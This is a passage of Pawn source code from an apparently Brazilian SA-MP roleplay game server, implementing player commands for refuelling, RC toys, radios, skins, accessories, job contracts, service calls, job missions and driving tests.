		if(!IsServerVehicle(vehid))
		{
			if(GetPlayerSysMoney(playerid) < pay)
			{
				format(string, sizeof string, "Você não possui dinheiro. Custo: $%d,00 dólares.", pay);
		    	SendClientMessage(playerid, COLOUR_GRAY, string);
		    	return 1;
			}
			
			GivePlayerSysMoney(playerid, -pay);
		}
		
		tdfuel = TextDrawCreate(21.0, 125.0, "_");
		TextDrawAlignment(tdfuel, 0);
		TextDrawFont(tdfuel, 1);
		TextDrawLetterSize(tdfuel, 0.5, 1.5);
		TextDrawColour(tdfuel, COLOUR_WHITE);
		TextDrawSetProportional(tdfuel, 1);
		TextDrawSetShadow(tdfuel, 1);
		TextDrawShowForPlayer(playerid, tdfuel);
		
		VFrozenFlags[playerid] |= VFROZEN_FUEL;
		TogglePlayerControllable(playerid, false);
		SetTimerEx("Fueling", 320, false, "ddddd", playerid, vehid, fuel, pay / FUEL_COST, _:tdfuel);
		return 1;
	}
	
	if(strcmp(cmd, "/galao", true) == 0)
	{
		new gcmd[128], xpath[128], string[128];
		new gallon, value;
		
		gcmd = strtok(cmdtext, idx);
		
		if(strlen(gcmd) > 0)
		{
		    xpath = GetPlayerXFilePath(playerid);
		    gallon = hGetInt(xpath, "Gallon");
		    
		    if(strcmp(gcmd, "comprar", true) == 0)
		    {
		        if(Area[playerid] != AREA_GAS_STATION)
				{
		    		SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um posto.");
		    		return 1;
				}
		
				if(gallon >= 20)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você já está com o galão completo.");
		    		return 1;
				}
				
				value = (20 - gallon) * FUEL_COST;
				
				if(GetPlayerSysMoney(playerid) < value)
				{
					format(string, sizeof string, "Você não possui dinheiro. Custo: $%d,00 dólares.", value);
					SendClientMessage(playerid, COLOUR_GRAY, string);
					return 1;
				}
				
				hSetInt(xpath, "Gallon", 20);
				GivePlayerSysMoney(playerid, -value);
				format(string, sizeof string, "Galão abastecido com %dL pelo valor de $%d,00 dólares.", 20 - gallon, value);
				SendClientMessage(playerid, COLOUR_WHITE, string);
		        return 1;
		    }
		    
		    if(strcmp(gcmd, "abastecer", true) == 0)
		    {
		        new vehid, fuel;
		        
		        if(!IsPlayerInAnyVehicle(playerid))
				{
		    		SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
		    		return 1;
				}
		
		        vehid = GetPlayerVehicleID(playerid);
				fuel = GetVehicleFuel(vehid);
				
				if(fuel + gallon >= 100)
				{
				    SetVehicleFuel(vehid, 100);
				    gallon -= 100 - fuel;
				}
				
				else
				{
				    SetVehicleFuel(vehid, fuel + gallon);
				    gallon = 0;
				}
				
				hSetInt(xpath, "Gallon", gallon);
				SendClientMessage(playerid, COLOUR_WHITE, "Veículo abastecido.");
		        return 1;
		    }
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "USO: /galao [comando] - COMANDOS DISPONÍVEIS:");
		SendClientMessage(playerid, COLOUR_GRAY, "comprar, abastecer");
	    return 1;
	}
	
	if(strcmp(cmd, "/brinquedo", true) == 0)
	{
	    new toy_cmd[128];

	    toy_cmd = strtok(cmdtext, idx);

	    if(strlen(toy_cmd) > 0)
	    {
			if(strcmp(toy_cmd, "ligar", true) == 0)
			{
			    new xpath[128], toy[128];
				new toyid, toys;
				new Float:X, Float:Y, Float:Z, Float:A;
			    
			    toy = strtok(cmdtext, idx);
			    toyid = -1;
			    
			    if(strlen(toy) > 0)
			    {
			        if(strcmp(toy, "bandit", true) == 0)
				        toyid = 0;

	                else if(strcmp(toy, "raider", true) == 0)
					    toyid = 1;

	                else if(strcmp(toy, "globin", true) == 0)
					    toyid = 2;

	                else if(strcmp(toy, "tiger", true) == 0)
					    toyid = 3;

                	else if(strcmp(toy, "cam", true) == 0)
				    	toyid = 4;
			    }
			    
			    if(toyid == -1)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "USO: /brinquedo ligar [brinquedo] - BRINQUEDOS DISPONÍVEIS:");
			        SendClientMessage(playerid, COLOUR_GRAY, "bandit, raider, globin, tiger, cam");
			        return 1;
			    }
			    
			    xpath = GetPlayerXFilePath(playerid);
			    toys = hGetInt(xpath, "Toys");
			    
			    if(!(toys & (1 << toyid)))
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não possui este brinquedo.");
			        return 1;
			    }

				if(CurrentToy[playerid] != -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você já está usando um brinquedo.");
			        return 1;
				}
				
				if(IsPlayerInAnyVehicle(playerid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Saiá do veículo para usar o brinquedo.");
			        return 1;
				}
				
				if(hGetInt(xpath, "Battery") <= 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você precisa recarregar seu brinquedo para usá-lo.");
			        return 1;
				}
				
				GetPlayerPos(playerid, X, Y, Z);
				GetPlayerFacingAngle(playerid, A);
				
				X += 2.5 * floatsin(-A, degrees);
				Y += 2.5 * floatcos(-A, degrees);
				
				CurrentToy[playerid] = CreateVehicle(RCs[toyid], X, Y, Z, A, -1, -1, -1);
				PutPlayerInVehicle(playerid, CurrentToy[playerid], 0);
				return 1;
			}
			
			else if(strcmp(toy_cmd, "desligar", true) == 0)
			{
			    new xpath[128];
			    new model, toy;
			    new Float:health;
			    
			    if(CurrentToy[playerid] == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está usando um brinquedo.");
			        return 1;
				}
				
				GetVehicleHealth(CurrentToy[playerid], health);
				
				if(health <= 600.0)
				{
				    xpath = GetPlayerXFilePath(playerid);
				    model = GetVehicleModel(CurrentToy[playerid]);
				    
				    for(new t = 0; t < sizeof RCs; t++)
					{
					    if(RCs[t] == model)
					    {
					        toy = t;
					        break;
					    }
					}
					
				    hSetInt(xpath, "Toys", hGetInt(xpath, "Toys") & ~(1 << toy));
				    DrawTextForPlayer(playerid, "Brinquedo destruído.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
				}
				
				RemovePlayerFromVehicle(playerid);
				DestroyVehicle(CurrentToy[playerid]);
				CurrentToy[playerid] = -1;
				return 1;
			}
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "USO: /brinquedo [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "ligar, desligar");
	    return 1;
	}
	
	if(strcmp(cmd, "/walktalkie", true) == 0)
	{
	    if(hGetInt(GetPlayerXFilePath(playerid), "Itens") & ITEM_WALKTALKIE == 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não possui um Walk-Talkie.");
	        return 1;
	    }
	    
	    new radio_cmd[128];

	    radio_cmd = strtok(cmdtext, idx);

	    if(strlen(radio_cmd) > 0)
	    {
	    	if(strcmp(radio_cmd, "sintonizar", true) == 0)
	    	{
	    	    new string[128];
	    	    new station;
	    	    
	    	    station = strval(strtok(cmdtext, idx));
	    	    
	    	    if(station < 1000 || station > 9999)
	    	    {
	    	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /walktalkie sintonizar [1000~9999]");
	    	        return 1;
	    	    }
	    	    
	    	    if(Radio[playerid] == station)
	    	    {
	    	        SendClientMessage(playerid, COLOUR_GRAY, "Seu rádio já está sintonizado nessa estação.");
	    	        return 1;
	    	    }
	    	    
	    	    Radio[playerid] = station;
	    	    format(string, sizeof string, "[Walk-Talkie] Radio sintonizado na estação %d.", station);
	    	    SendClientMessage(playerid, COLOUR_DARK_GOLD, string);
	    	    format(string, sizeof string, "~w~Pressione ~y~%s ~w~ou ~y~%s ~w~para mensagens rápidas.", GetKeyName(K_SPEAK, 1), GetKeyName(K_SPEAK, 0));
                DrawTextForPlayer(playerid, string, COLOUR_WHITE, TEXTDRAW_STYLE_2, 4000);
	    	    return 1;
	    	}
	    	
	    	else if(strcmp(radio_cmd, "falar", true) == 0)
	    	{
	    	    new text[128];

                if(Dying[playerid] != 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode falar enquanto estiver inconsciente.");
	    	        return 1;
				}
				
                if(Radio[playerid] == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Seu rádio está desligado.");
	    	        return 1;
				}

				strmid(text, cmdtext, idx, strlen(cmdtext));
				Speak(playerid, text);
	    	    return 1;
	    	}
	    	
	    	else if(strcmp(radio_cmd, "estacao", true) == 0)
	    	{
	    	    new string[128];
	    	    
                if(Radio[playerid] == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Seu rádio está desligado.");
	    	        return 1;
				}
				
				format(string, sizeof string, "[Walk-Talkie] Atual estação: %d", Radio[playerid]);
				SendClientMessage(playerid, COLOUR_DARK_GOLD, string);
	    	    return 1;
	    	}
	    	
	    	else if(strcmp(radio_cmd, "desligar", true) == 0)
	    	{
				if(Radio[playerid] == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Seu rádio já está desligado.");
	    	        return 1;
				}

				Radio[playerid] = -1;
				SendClientMessage(playerid, COLOUR_DARK_GOLD, "[Walk-Talkie] Walk-Talkie desligado!");
	    	    return 1;
	    	}
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "USO: /walktalkie [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "sintonizar, falar, estacao, desligar");
	    return 1;
	}
	
	if(strcmp(cmd, "/usarskin", true) == 0)
	{
	    new tmp[128];
	    
	    tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
 		{
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /usarskin [pessoal/trabalho]");
	        return 1;
	    }
	    
	    if(strcmp(tmp, "pessoal", true) == 0)
	    {
	        new hpath[128];
   			new houseid;

		    houseid = House[playerid];

		    if(houseid == -1)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
			    return 1;
			}

			hpath = GetHouseFilePath(houseid);

			if(hGetInt(hpath, "Deleted") == 1)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
			    return 1;
			}

			if(strcmp(PlayerName(playerid), hGetString(hpath, "Owner"), true) && strcmp(PlayerName(playerid), hGetString(hpath, "Rent"), true))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário da casa.");
			    return 1;
			}
			
	        SetPlayerSkin(playerid, hGetInt(GetPlayerXFilePath(playerid), "Skin"));
	        SendClientMessage(playerid, COLOUR_GREEN, "Skin pessoal adquirida.");
	        return 1;
	    }
	    
	    else if(strcmp(tmp, "trabalho", true) == 0)
	    {
	        new rand, com, aux;
	        
	        if(pjob == JOB_UNEMPLOYED)
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você está desempregado no momento...");
	            return 1;
	        }
	        
	        aux = -1;
	        com = Company[playerid];
	        
	        if(com == 0)
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você não está na sua agência de trabalho.");
	            return 1;
	        }
	        
	        if(IsPlayerCop(playerid))
	        {
	            aux = pjob;
	            pjob = JOB_POLICE;
			}
			
	        if(Companies[com][cJob] != pjob)
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você não está na sua agência de trabalho.");
	            return 1;
	        }
	        
	        if(aux != -1)
	            pjob = aux;
	            
	        if(Jobs[pjob][jobSkins][0] == 0)
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Sua profissão não possui uma skin específica.");
	            return 1;
	        }
			
			do
				rand = random(4);
			while(Jobs[pjob][jobSkins][rand] == 0);
			
			SetPlayerSkin(playerid, Jobs[pjob][jobSkins][rand]);
			SendClientMessage(playerid, COLOUR_GREEN, "Skin de trabalho adquirida.");
			return 1;
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /usarskin [pessoal/trabalho]");
	    return 1;
	}
	
	if(strcmp(cmd, "/acessorios", true) == 0)
	{
	    new accessories[1024];
	    new tmp[128];
		new int, type;
		
		int = GetPlayerInt(playerid);

		if(int != INT_BINCO && int != INT_SUB_URBAN && int != INT_PRO_LAPS && int != INT_VICTIM && int != INT_DIDIER_SACHS)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma loja de roupas!");
		    return 1;
		}
		
		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /acessorios [tipo] - TIPOS DISPONÍVEIS:");
		    SendClientMessage(playerid, COLOUR_GRAY, "chapeus, oculos, guitarras");
		    return 1;
		}
		
		if(strcmp(tmp, "chapeus", true) == 0)
		    type = ACCESSORY_TYPE_HAT;
		    
		else if(strcmp(tmp, "oculos", true) == 0)
		    type = ACCESSORY_TYPE_GLASSES;
		    
        else if(strcmp(tmp, "guitarras", true) == 0)
		    type = ACCESSORY_TYPE_GUITAR;
		    
		else
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Tipo de acessório inválido.");
		    return 1;
		}
		    
		for(new a = 1; a < sizeof Accessories; a++)
		{
		    if(Accessories[a][accessoryType] == type)
		        format(accessories, sizeof accessories, "%s{FFFFFF}%s {00FF00}($%d,00 dólares)\r\n", accessories, Accessories[a][accessoryName], Accessories[a][accessoryValue]);
		}
		
		AccessoryType[playerid] = type;
	    ShowPlayerDialog(playerid, DIALOG_ACCESSORIES, DIALOG_STYLE_LIST, "{00FF00}Acessórios", accessories, "Comprar", "Cancelar");
	    return 1;
	}
	
	if(strcmp(cmd, "/acessorio", true) == 0)
	{
	    new accessory_cmd[128];
	    new tmp[128];
	    new type, acccmd, accessoryid;
	    
	    accessory_cmd = strtok(cmdtext, idx);
	    tmp = strtok(cmdtext, idx);
		type = ACCESSORY_TYPE_NULL;
		acccmd = 0;

		if(strlen(tmp) > 0)
		{
		    if(strcmp(tmp, "chapeus", true) == 0)
		    	type = ACCESSORY_TYPE_HAT;

			else if(strcmp(tmp, "oculos", true) == 0)
			    type = ACCESSORY_TYPE_GLASSES;

	        else if(strcmp(tmp, "guitarras", true) == 0)
			    type = ACCESSORY_TYPE_GUITAR;
		}
		
	    if(strlen(accessory_cmd) > 0)
	    {
	        if(strcmp(accessory_cmd, "usar", true) == 0)
	            acccmd = 1;
	        
	        else if(strcmp(accessory_cmd, "esconder", true) == 0)
                acccmd = 2;
	        
	        else if(strcmp(accessory_cmd, "vender", true) == 0)
                acccmd = 3;
	        
	        else if(strcmp(accessory_cmd, "remover", true) == 0)
				acccmd = 4;
		}

		if(acccmd == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /acessorio [comando] - COMANDOS DISPONÍVEIS:");
	    	SendClientMessage(playerid, COLOUR_GRAY, "usar, esconder, vender, remover");
	    	return 1;
		}
		
		if(type == ACCESSORY_TYPE_NULL)
		{
		    new errmsg[128];
		    
		    format(errmsg, sizeof errmsg, "USO: /acessorio %s [tipo] - TIPOS DISPONÍVEIS:", accessory_cmd);
			SendClientMessage(playerid, COLOUR_GRAY, errmsg);
  			SendClientMessage(playerid, COLOUR_GRAY, "chapeus, oculos, guitarras");
   			return 1;
		}
	    
	    accessoryid = GetPlayerAccessory(playerid, type);
	    
	    if(accessoryid == 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não possui esse tipo de acessório.");
	        return 1;
	    }
	    
	    switch(acccmd)
	    {
	        case 1:
	        {
	            SetPlayerAccessory(playerid, accessoryid);
	            SendClientMessage(playerid, COLOUR_WHITE, "Acessório mostrado.");
	        }
	        
	        case 2:
	        {
	            RemovePlayerAccessory(playerid, type);
	            SendClientMessage(playerid, COLOUR_WHITE, "Acessório escondido.");
	        }
	        
	        case 3:
	        {
	            new string[128];
	            new int;
	            
	            int = GetPlayerInt(playerid);

				if(int != INT_BINCO && int != INT_SUB_URBAN && int != INT_PRO_LAPS && int != INT_VICTIM && int != INT_DIDIER_SACHS)
				{
		    		SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma loja de roupas!");
		    		return 1;
				}
		
	            DeletePlayerAccessory(playerid, type);
				GivePlayerSysMoney(playerid, Accessories[accessoryid][accessoryValue]);
	            format(string, sizeof string, "Acessório vendido, você recebeu $%d,00 dólares.", Accessories[accessoryid][accessoryValue]);
	            SendClientMessage(playerid, COLOUR_WHITE, string);
	        }
	        
	        case 4:
	        {
	            DeletePlayerAccessory(playerid, type);
	            SendClientMessage(playerid, COLOUR_WHITE, "Acessório removido.");
	        }
	    }
	    
	    return 1;
	}
	
	if(strcmp(cmd, "/assinar", true) == 0)
	{
	    new xpath[128];
		new com, jobid, hab, habt, habn, haba, company, post, reward, payday;
			    
	    com = Company[playerid];
	    
	    if(com == 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma empresa para assinar um contrato.");
	        return 1;
	    }
	    
		if(GetPlayerCounter(playerid, COUNTER_JOB) > 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Seu prazo de contrato com a outra empresa ainda não terminou.");
	        return 1;
		}
		
		xpath = GetPlayerXFilePath(playerid);
	    jobid = Companies[com][cJob];
	    
	    if(hGetInt(xpath, "Job") == jobid)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você já está trabalhando nessa empresa.");
	        return 1;
	    }
	    
	    hab = hGetInt(xpath, "Hab");
	   	habt = (hab >> 2) & 0x1;
		habn = (hab >> 1) & 0x1;
		haba = hab & 0x1;
	    
		if(habt == 0 && Jobs[jobid][jobHabT] == 1)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve ter carteira de habilitação terrestre para assinar um contrato com essa empresa.");
	        return 1;
		}
		
		if(habn == 0 && Jobs[jobid][jobHabN] == 1)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve ter carteira de habilitação naútica para assinar um contrato com essa empresa.");
	        return 1;
		}
		
		if(haba == 0 && Jobs[jobid][jobHabA] == 1)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve ter carteira de habilitação aérea para assinar um contrato com essa empresa.");
	        return 1;
		}
		
		if(hGetInt(xpath, "Level") < Jobs[jobid][jobLevel])
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não tem experiência suficiente para assinar um contrato com essa empresa.");
	        return 1;
		}
		
		hSetInt(xpath, "Job", jobid);
		SetPlayerCounter(playerid, COUNTER_JOB, 120);
		ChangePlayerJob(playerid, jobid);
		GetPlayerCompanyData(playerid, company, post, reward, payday);
		
		if(company != 0 && post == COMPANY_POST_EMPLOYEE)
			Dismiss(playerid);
			
		SendClientMessage(playerid, COLOUR_GREEN, "Contrato assinado! Você só poderá mudar de profissão novamente após 120 minutos (2h na realidade).");
		return 1;
	}
	
	if(strcmp(cmd, "/emprego", true) == 0)
	{
	    new listid, cmds, results;
	    new string[128];
	    new bool:sent;
	    
	    listid = strval(strtok(cmdtext, idx));

		if(listid <= 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Lista invalida, as listas iniciam pelo ID 1.");
		    return 1;
		}
		
  		cmds = NCOMMANDS * (listid - 1);
  		results = 0;
		sent = false;
	    
		for(new j = 0; j < sizeof JobCommands; j++)
		{
		    for(new jid = 0; jid < 6; jid++)
		    {
		        if(pjob == JobCommands[j][jJobs][jid])
		        {
			    	if(results >= cmds)
			    	{
			    	    if(!sent)
			    	    {
			    	        format(string, sizeof string, "Comandos de %s - [ Parte %s ]:", Jobs[pjob][jobName], NumericToRoman(listid));
			    	        SendClientMessage(playerid, COLOUR_WHITE, string);
			    	        sent = true;
			    	    }
			    	    
			    	    if(strlen(JobCommands[j][jCmd]) > 0)
							format(string, sizeof string, "%s - %s", JobCommands[j][jCmd], JobCommands[j][jDescription]);
							
						else
						    format(string, sizeof string, "%s", JobCommands[j][jDescription]);
						
						SendClientMessage(playerid, Jobs[pjob][jobColour], string);
					}

					results++;
					break;
				}
			}
			
			if(results >= cmds + NCOMMANDS)
   				break;
		}
        
		if(results <= cmds)
		{
			
			format(string, sizeof string, "USO: /emprego [1-%d]", (results / NCOMMANDS) + 1);
			SendClientMessage(playerid, COLOUR_GRAY, string);
		}
		
		else if(results - cmds == NCOMMANDS)
		{
		    format(string, sizeof string, "Para ver a próxima lista digite: /emprego %d", listid + 1);
		    SendClientMessage(playerid, COLOUR_WHITE, string);
		}
		
		return 1;
	}
	
	if(strcmp(cmd, "/servico", true) == 0)
	{
	    new xpath[128], service[128], string[128];
	    new phone, model;
	    
	    xpath = GetPlayerXFilePath(playerid);
	    phone = GetPlayerPhone(playerid);
	    
	    if(phone == 0 && (hGetInt(xpath, "Level") != 0 || hGetInt(xpath, "Xpoint") != 0))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não possui um celular.");
	        return 1;
	    }

        if(Call[playerid] != 0)
		{
			SendClientMessage(playerid, COLOUR_GRAY, "Você deve finalizar a chamada para prosseguir.");
			return 1;
		}
		
		service = strtok(cmdtext, idx);
		model = -1;
		string[0] = '\0';
		
		if(strlen(service) > 0)
		{
		    if(strcmp(service, "190", true) == 0)
		    {
				model = 1;
				format(string, sizeof string, "%s esta solicitando a policia, deseja atende-lo?", PlayerName(playerid));
		    }
		    
		    else if(strcmp(service, "911", true) == 0)
		    {
		        model = 2;
		        format(string, sizeof string, "%s esta solicitando emergencia, deseja atende-lo?", PlayerName(playerid));
		    }
		    
		    else if(strcmp(service, "pizza", true) == 0)
		    {
				model = 3;
				format(string, sizeof string, "%s esta solicitando uma pizza, deseja atende-lo?", PlayerName(playerid));
		    }
		    
		    else if(strcmp(service, "taxi", true) == 0)
		    {
				model = 4;
				format(string, sizeof string, "%s esta solicitando um taxi, deseja atende-lo?", PlayerName(playerid));
		    }
		    
		    else if(strcmp(service, "piloto", true) == 0)
		    {
				model = 5;
				format(string, sizeof string, "%s esta solicitando transporte aereo, deseja atende-lo?", PlayerName(playerid));
		    }
		    
			if(strlen(string) > 0 && model != -1)
			{
			    new amount;
			    
			    for(new n = 0; n < MAX_SLOTS; n++)
			    {
			        if(IsPlayerConnected(n) && IsPlayerLogged(n))
			        {
						if(	(model == 1 && IsPlayerInJobVehicle(n, POLICE_CAR)) ||
							(model == 2 && IsPlayerInJobVehicle(n, AMBULANCE)) ||
							(model == 3 && IsPlayerInJobVehicle(n, SCOOTER)) ||
							(model == 4 && IsPlayerInJobVehicle(n, TAXI)) ||
							(model == 5 && IsPlayerInJobVehicle(n, PLANE) && GetVehicleModel(GetPlayerVehicleID(n)) == 487))
						{
						    SendPlayerInvite(n, INVALID_PLAYER_ID, playerid, INVITE_JOB, "Servicos", string, "Atender", "Recusar");
      						amount++;
						}
			        }
			    }

				if(amount == 0)
				    SendClientMessage(playerid, COLOUR_WHITE, "Nenhum funcionário deste emprego encontrado em serviço.");

				else
				    SendClientMessage(playerid, COLOUR_WHITE, "Serviço solicitado.");
				    
                SetPlayerCellPhoneAction(playerid);
			    SetTimerEx("PhoneCallError", 3000, false, "dd", playerid, 0);
			    return 1;
			}
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "USO: /servico [servico] - SERVIÇOS DISPONÍVEIS:");
		SendClientMessage(playerid, COLOUR_GRAY, "190, 911, pizza, taxi");
		return 1;
	}
	
	if(strcmp(cmd, "/submissao", true) == 0)
	{
	    new string[128];
	    new submission, int, place;
	    
	    for(new s = 0; s < SUBMISSION_MAX; s++)
		{
	        if(Submission[s] == playerid)
			{
			    if(s == SUBMISSION_DJ || s == SUBMISSION_FUNKDJ)
			    {
			        KeyEvent[playerid] &= ~KEY_EVENT_DJ;
			        
			        if(s == SUBMISSION_DJ)
			        	DeleteTimer(DiscoTimer);
			        	
					else
					    DeleteTimer(FunkTimer);
					    
			        SetCameraBehindPlayer(playerid);
			        TogglePlayerControllable(playerid, true);
					ClearAnimations(playerid);
			    }
			        
			    if(IsPlayerInVehicle(playerid, ICE_CREAM) || IsPlayerInVehicle(playerid, IML) || IsPlayerInVehicle(playerid, CEMENT) || IsPlayerInVehicle(playerid, POST))
			    {
			        new vehicleid;
			        
			        vehicleid = GetPlayerVehicleID(playerid);
			        TogglePlayerControllable(playerid, true);
			        RemovePlayerFromVehicle(playerid);
			        SetVehicleToRespawn(vehicleid);
				}
				
	            Submission[s] = INVALID_PLAYER_ID;
	            DisablePlayerRaceCheckpoint(playerid);
	            SetVehicleParamsForPlayer(ICE_CREAM, playerid, 0, 1);
    			SetVehicleParamsForPlayer(IML, playerid, 0, 1);
    			SetVehicleParamsForPlayer(CEMENT, playerid, 0, 1);
    			SetVehicleParamsForPlayer(POST, playerid, 0, 1);
	            SendClientMessage(playerid, COLOUR_WHITE, "Submissão cancelada!");
	            return 1;
	        }
	    }
	    
	    submission = -1;
	    int = GetPlayerInt(playerid);

	    if(Area[playerid] == AREA_ICE_CREAM)
			submission = SUBMISSION_ICE_CREAM;
			
        else if(Area[playerid] == AREA_IML)
            submission = SUBMISSION_IML;
            
		else if(Area[playerid] == AREA_CEMENT)
	  		submission = SUBMISSION_CEMENT;
	  		
		else if(Area[playerid] == AREA_POST)
		    submission = SUBMISSION_POST;
		    
		else if(Company[playerid] == COMPANY_CRACK)
		    submission = SUBMISSION_DRUGS;
		    
	    else if(int == INT_DISCO)
	        submission = SUBMISSION_DJ;
	        
		else if(int == INT_FUNK)
		    submission = SUBMISSION_FUNKDJ;
		
		if(submission < 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um local de submissão!");
		    return 1;
		}
		
		if(Submission[submission] != INVALID_PLAYER_ID)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Submissão ocupada, já há alguém trabalhando nela.");
		    return 1;
		}
		
		Submission[submission] = playerid;
		SendClientMessage(playerid, COLOUR_WHITE, "Submissão aceita!");
		
		switch(submission)
		{
		    case SUBMISSION_ICE_CREAM:
		    {
		        IceCream = random(3) + 2;
		        place = random(sizeof IceCreamPlaces);
		        SetPlayerRaceCheckpoint(playerid, 1, IceCreamPlaces[place][0], IceCreamPlaces[place][1], IceCreamPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
                SetVehicleParamsForPlayer(ICE_CREAM, playerid, 0, 0);
				format(string, sizeof string, "[SORVETERIA] Você tem %d sorvetes para entregar.", IceCream);
		        SendClientMessage(playerid, COLOUR_ICE_CREAM, string);
		    }
		    
		    case SUBMISSION_DRUGS:
		    {
		        Drugs = random(4) + 2;
		        place = random(sizeof DrugPlaces);
		        SetPlayerRaceCheckpoint(playerid, 1, DrugPlaces[place][0], DrugPlaces[place][1], DrugPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
				format(string, sizeof string, "Aew maluco, tu tem %d entregas pra fazer, num vacila ou vai ter treta, tá ligado?! Aqui é Corintia mano.", Drugs);
				SendClientMessage(playerid, COLOUR_DRUGS, string);
		    }
		    
		    case SUBMISSION_DJ, SUBMISSION_FUNKDJ:
		    {
		        KeyEvent[playerid] |= KEY_EVENT_DJ;
		        TogglePlayerControllable(playerid, false);
				SetPlayerCameraPos(playerid, 487.0688, -2.7831, 1002.3828);
				SetPlayerCameraLookAt(playerid, 487.6468, -14.4335, 1000.6797);
				SetPlayerPos(playerid, 476.0887, -15.1642, 1003.6953);
				SendClientMessage(playerid, COLOUR_DJ, "[DISCOTECA] A festa começou, woooooow!");
				SendClientMessage(playerid, COLOUR_DJ, "[DISCOTECA] Aperte as setinhas para os lados para mudar as músicas.");
		    }
		    
		    case SUBMISSION_IML:
		    {
		        Bodies = 0;
		        SetPlayerRaceCheckpoint(playerid, 1, 1184.0129, -1323.1227, 13.1519, 0.0, 0.0, 0.0, 4.0);
		        SetVehicleParamsForPlayer(IML, playerid, 0, 0);
		        SendClientMessage(playerid, COLOUR_IML, "Vá buscar os corpos no hospital.");
		    }
		    
			case SUBMISSION_CEMENT:
			{
			    Cement = 0;
			    place = random(sizeof CementPlaces);
			    SetPlayerRaceCheckpoint(playerid, 1, CementPlaces[place][0], CementPlaces[place][1], CementPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
                SetVehicleParamsForPlayer(CEMENT, playerid, 0, 0);
				SendClientMessage(playerid, COLOUR_CEMENT, "[CIMENTARIA] Transporte o caminhão para o descarregamento.");
			}
			
			case SUBMISSION_POST:
			{
			    Posts = random(4) + 2;
		        place = random(sizeof PostPlaces);
		        SetPlayerRaceCheckpoint(playerid, 1, PostPlaces[place][0], PostPlaces[place][1], PostPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
                SetVehicleParamsForPlayer(POST, playerid, 0, 0);
				format(string, sizeof string, "[COMPANHIA ELÉTRICA] É necessário realizar a manutenção em %d postes.", Posts);
				SendClientMessage(playerid, COLOUR_POST, string);
			}
		}
		
	    return 1;
	}
	
	if(strcmp(cmd, "/teste", true) == 0)
	{
	    new hab, habt, habn, haba;
	    
	    hab = hGetInt(GetPlayerXFilePath(playerid), "Hab");
	    habt = (hab >> 2) & 0x1;
		habn = (hab >> 1) & 0x1;
		haba = hab & 0x1;
	    
        if(Area[playerid] == AREA_HABT)
	    {
	        if(habt == 1)
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você já possui habilitação terrestre...");
			    return 1;
	        }
	        
			if(TestPlayerT != INVALID_PLAYER_ID)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Há alguém executando o teste, aguarde...");
			    return 1;
			}
			
			TestPlayerT = playerid;
			TestPartT = 0;
			TestChancesT = 3;
			SendClientMessage(playerid, COLOUR_RED, "[AUTO ESCOLA] O teste irá iniciar em alguns segundos...");
			SetTimer("LicenseTestT", 3000, false);
	        return 1;
	    }
	    
		if(Area[playerid] == AREA_HABN)
		{
		    if(habn == 1)
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você já possui habilitação náutica...");
			    return 1;
	        }
	        
		    if(TestPlayerN != INVALID_PLAYER_ID)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Há alguém executando o teste, aguarde...");
